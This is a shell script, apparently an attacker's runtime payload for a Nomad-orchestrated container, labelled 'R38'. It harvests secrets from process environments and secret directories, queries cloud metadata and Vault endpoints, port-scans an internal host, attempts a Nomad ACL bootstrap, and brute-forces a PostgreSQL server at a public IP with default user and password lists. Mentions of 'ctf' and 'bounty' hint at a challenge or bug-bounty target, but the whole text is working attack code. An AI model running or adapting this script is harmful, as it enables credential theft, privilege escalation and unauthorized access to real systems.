#!/bin/sh
echo "R38-RUNTIME"

echo "=== BUILD PHASE OUTPUT ==="
cat /build_output.txt 2>/dev/null || echo "No build output file"
echo "=== END BUILD OUTPUT ==="

N=https://169.254.1.2:4646
ALLOC=$(sed -n 's|.*alloc/\([a-f0-9-]*\)/.*|\1|p' /proc/self/mountinfo | head -1)
echo "alloc=$ALLOC"

echo "--- ALL PIDS ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n); do
  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 300)
  if [ -n "$cmdline" ]; then
    echo "PID=$pid CMD=$cmdline"
  fi
done

echo "--- PID ENVIRONS ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n | head -50); do
  env=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' 2>/dev/null)
  if [ -n "$env" ]; then
    echo "=PID=$pid="
    echo "$env" | grep -iE '(pass|secret|token|key|auth|cred|vault|consul|nomad|aiven|falcon|flag|ssh|cert|pg|database|conn|uri|url)' 2>/dev/null
  fi
done

echo "--- METADATA ---"
for ip in 169.254.169.254 169.254.1.1 169.254.1.2; do
  resp=$(curl -sk --connect-timeout 2 http://$ip/ 2>&1)
  if [ $? -eq 0 ] && [ -n "$resp" ]; then echo "$ip: $resp" | head -c 300; echo; fi
  resp=$(curl -sk --connect-timeout 2 http://$ip/latest/meta-data/ 2>&1)
  if [ $? -eq 0 ] && [ -n "$resp" ]; then echo "$ip/meta: $resp" | head -c 300; echo; fi
done

echo "--- VAULT PROBE ---"
for ip in 169.254.1.2 127.0.0.1; do
  for port in 8200 8201; do
    resp=$(curl -sk --connect-timeout 2 https://$ip:$port/v1/sys/health 2>&1)
    echo "vault $ip:$port: $resp" | head -c 200
    echo
  done
done

echo "--- PORT SCAN 169.254.1.2 ---"
for port in 53 80 443 2379 2380 4646 4647 4648 5432 6443 8080 8200 8201 8300 8301 8500 8501 8600 9090 9093 9100 9200 10250 12691 13133 15432 28319; do
  (echo >/dev/tcp/169.254.1.2/$port) 2>/dev/null && echo "OPEN:$port"
done

echo "--- DNS ---"
cat /etc/resolv.conf
for name in vault vault.service.consul consul falcon falcon.service.consul nomad.service.consul postgresql.service.consul; do
  result=$(dig +short $name @169.254.1.2 2>/dev/null)
  [ -n "$result" ] && echo "DNS $name -> $result"
  result2=$(dig +short $name 2>/dev/null)
  [ -n "$result2" ] && echo "DNS-def $name -> $result2"
done

echo "--- NETWORK ---"
ip addr 2>/dev/null | grep inet
ip route 2>/dev/null

echo "--- SECRETS ---"
ls -laR /secrets/ 2>&1
ls -laR /local/ 2>&1
cat /secrets/* 2>&1
cat /local/* 2>&1

echo "--- ENV ---"
env | sort

echo "--- NOMAD ENDPOINTS ---"
echo "ACL bootstrap:"
curl -sk -X POST $N/v1/acl/bootstrap 2>&1 | head -c 300
echo
echo "Client alloc:"
curl -sk $N/v1/client/allocation/$ALLOC 2>&1 | head -c 500
echo
echo "Alloc details from metrics:"
curl -sk $N/v1/metrics?format=prometheus 2>/dev/null | grep -o 'job="[^"]*"' | sort -u
echo "Falcon-related in metrics:"
curl -sk $N/v1/metrics?format=prometheus 2>/dev/null | grep -iE '(falcon|pgsql|flag|ssh|key|credential|secret)' | head -20

echo "--- FALCON PG ---"
for user in avnadmin postgres falcon ctf flag admin replication; do
  for pass in falcon ctf flag bounty test password aiven admin postgres changeme hunter2 secret; do
    result=$(PGPASSWORD="$pass" psql "host=132.145.163.127 port=12691 dbname=defaultdb sslmode=require user=$user connect_timeout=3" -c "SELECT version()" 2>&1)
    if ! echo "$result" | grep -q "password authentication failed"; then
      echo "PG-HIT: $user/$pass: $result"
    fi
  done
done

echo "--- TRY SSLMODE DISABLE ---"
for user in avnadmin postgres _aiven; do
  PGPASSWORD="" psql "host=132.145.163.127 port=12691 dbname=defaultdb sslmode=disable user=$user connect_timeout=3" -c "SELECT 1" 2>&1 | head -3
done

echo "--- DONE R38 ---"
sleep 600
